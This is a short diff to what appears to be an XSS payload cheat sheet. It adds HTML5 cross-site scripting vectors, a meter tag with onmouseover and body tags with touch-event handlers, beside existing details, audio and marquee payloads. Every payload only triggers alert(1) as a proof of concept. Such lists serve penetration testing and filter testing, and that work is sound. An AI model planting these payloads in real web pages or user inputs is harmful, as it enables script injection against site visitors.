@@ -95,6 +95,11 @@ XSS for HTML5
 <details/open/ontoggle="alert`1`">
 <audio src onloadstart=alert(1)>
 <marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+
+<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
+<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
+<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
 ```
 
 XSS using script tag (external payload)
